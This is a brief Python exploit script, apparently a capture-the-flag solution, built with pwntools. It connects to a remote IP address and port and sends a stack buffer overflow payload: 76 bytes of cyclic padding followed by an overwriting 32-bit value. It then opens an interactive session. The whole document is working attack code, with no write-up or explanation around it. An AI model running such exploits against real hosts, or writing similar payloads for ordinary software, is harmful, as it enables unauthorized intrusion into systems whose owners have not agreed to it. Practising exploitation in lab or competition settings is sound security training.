from pwn import *
c = remote('103.77.175.40', 6001)

a=cyclic(76)
b = p32(0x13141516)
payload = a+b
c.sendline(payload)
c.interactive()
